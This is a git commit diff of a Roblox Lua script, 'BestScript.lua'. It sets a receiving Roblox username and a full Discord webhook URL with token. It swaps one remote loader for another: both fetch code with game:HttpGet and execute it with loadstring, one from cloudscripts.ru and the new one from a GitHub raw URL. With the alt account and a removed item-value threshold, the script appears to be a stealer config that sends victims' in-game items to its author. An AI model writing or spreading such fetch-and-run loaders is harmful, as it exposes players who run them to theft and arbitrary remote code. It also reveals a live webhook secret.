b08033ffee2a4c8b49829d7108dec49245575016
GODZUUU <plastikvr@gmail.com>
2024-09-28 16:11:54 +0200

    Update BestScript.lua

--- BestScript.lua
+++ BestScript.lua
@@ -1,8 +1,4 @@
-Username= 'granny452423kill'
---your roblox username(preferably alt account)
-Webhook= 'https://discord.com/api/webhooks/1289261162310930563/6QPSHFAwsMMLJGU02eYsZucY6LUhgu91y9yd3nAduhnGdW6PN8jccpmaJqManr_coMm7'
---your Discord webhook
+Username = 'granny452423kill'
+Webhook = 'https://discord.com/api/webhooks/1289261162310930563/6QPSHFAwsMMLJGU02eYsZucY6LUhgu91y9yd3nAduhnGdW6PN8jccpmaJqManr_coMm7'
 
-MinimumRAP = 250000
-
-loadstring(game:HttpGet('https://cloudscripts.ru/raw/ps99'))()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/terabite-max43/shitescripts/main/configs.lua"))()
